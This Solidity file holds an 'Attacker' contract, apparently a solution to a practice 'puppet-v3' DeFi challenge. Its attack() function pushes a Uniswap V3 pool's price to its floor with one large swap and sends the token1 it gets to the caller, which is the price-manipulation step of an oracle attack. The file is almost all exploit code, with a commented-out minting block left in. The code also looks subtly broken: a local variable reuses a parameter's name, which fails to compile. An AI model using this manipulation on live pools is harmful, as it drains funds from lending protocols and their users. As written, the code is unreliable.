// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;
import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
import {TickMath} from "lib/v3-core/contracts/libraries/TickMath.sol";
contract Attacker {

    IERC20 public token0;
    IERC20 public token1;
    IUniswapV3Pool public uniswapv3pool;
    INonfungiblePositionManager public positionmanager;

    event Transfer(address from, address to, uint256 amount);

    constructor(address _token0, address _token1, IUniswapV3Pool _uniswapv3pool, INonfungiblePositionManager _positionmanager) {
        token0 = IERC20(_token0);
        token1 = IERC20(_token1);
        uniswapv3pool = _uniswapv3pool;
        positionmanager = _positionmanager;
    }

    function uniswapV3SwapCallback(int256 amount0, int256 amount1, bytes calldata) external {
        if (amount0 > 0) {
            token0.transfer(msg.sender, uint256(amount0));
        }

        if (amount1 > 0) {
            token1.transfer(msg.sender, uint256(amount1));
        }
    }

    function attack(int256 amount) external {
        token0.approve(address(positionmanager), token0.balanceOf(address(this)));
        token1.approve(address(positionmanager), token1.balanceOf(address(this)));
        
        uniswapv3pool.swap({recipient: address(this), 
                            zeroForOne: true,
                            amountSpecified: amount,
                            sqrtPriceLimitX96: TickMath.MIN_SQRT_RATIO+1,
                            data: ""});
        uint256 amount = token1.balanceOf(address(this));
        token1.transfer(msg.sender, amount);
        // emit Transfer(address(this), msg.sender, amount);
    }

    

        // positionmanager.mint(
        //     INonfungiblePositionManager.MintParams({
        //         token0: address(token0),
        //         token1: address(token1),
        //         tickLower: -75000-60,
        //         tickUpper: -75000+60,
        //         fee: 3000,
        //         recipient: address(this),
        //         amount0Desired: 10e18,
        //         amount1Desired: 5532918018494444,
        //         amount0Min: 0,
        //         amount1Min: 0,
        //         deadline: block.timestamp
        //     })
        // );
        // console.log("dvt", token0.balanceOf(address(this)));
        // console.log("weth", token1.balanceOf(address(this)));
        // uint256 amount = token1.balanceOf(address(this));
        // token1.transfer(msg.sender, amount);
        // emit Transfer(address(this), msg.sender, amount);
   
}